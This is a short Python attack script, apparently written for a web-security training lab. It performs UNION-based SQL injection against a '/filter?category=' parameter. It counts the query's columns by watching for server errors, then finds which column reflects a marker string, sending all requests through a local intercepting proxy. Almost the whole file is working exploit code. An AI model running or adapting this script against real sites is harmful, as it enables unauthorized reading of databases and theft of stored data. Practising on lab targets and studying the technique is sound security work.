# script to get number of colummn 
#!/usr/bin/python3
import sys
import requests
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 

proxy ={'http' : 'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit(url, payload ):
	path='/filter?category='
	
	for i in range(1,30):
		act_payload=payload+' '+str(i)+'--'
		#print(act_payload) 
		print(url+path+act_payload)
		#break
		r=requests.get(url+path+act_payload, verify=False, proxies=proxy)
		res = r.text
		if 'Internal Server Error' in res:
			return i-1
	
def sqli_col(url,col):
	path='/filter?category='
	for i in range(1,col+1):
		lis=['NULL']*3
		string="'E1oy0w'"
		lis[i-1]=string
		payload="'UNION SELECT " +','.join(lis)+'--'
		
		#print(payload)
		r=requests.get(url+path+payload,verify=False,proxies=proxy)
		print(url+path+payload)
		res=r.text
		#if string.strip(' \'') in res:
		if string.strip('\'') in res:
			return i
	


if __name__=='__main__':
	try:
		url=sys.argv[1]
		payload=sys.argv[2]
	except:
		print('[-] usage <url> <payload> ')
		print('[-] usage www.example.com 1=1')
		sys.exit()
	col =  exploit(url,payload)
	if col :
		print('[+] number of column are :'+ str(col))
		print('[+] getting the column that contains text')
		res=sqli_col(url,col)
		if res:
			print("[+] The col_num that contains text is "+str(res))
		else:
			print('[-] Not any column')
		
	else:
		print("not found")
		
